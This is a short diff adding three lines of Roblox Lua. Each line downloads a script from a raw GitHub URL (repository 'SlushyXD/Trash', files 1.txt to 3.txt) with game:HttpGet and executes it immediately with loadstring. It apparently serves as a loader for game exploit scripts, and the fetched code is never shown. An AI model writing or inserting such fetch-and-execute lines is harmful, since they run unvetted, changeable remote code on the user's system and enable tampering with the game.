@@ -1,0 +1,3 @@
+loadstring(game:HttpGet(("https://raw.githubusercontent.com/SlushyXD/Trash/main/1.txt"), true))()
+loadstring(game:HttpGet(("https://raw.githubusercontent.com/SlushyXD/Trash/main/2.txt"), true))()
+loadstring(game:HttpGet(("https://raw.githubusercontent.com/SlushyXD/Trash/main/3.txt"), true))()
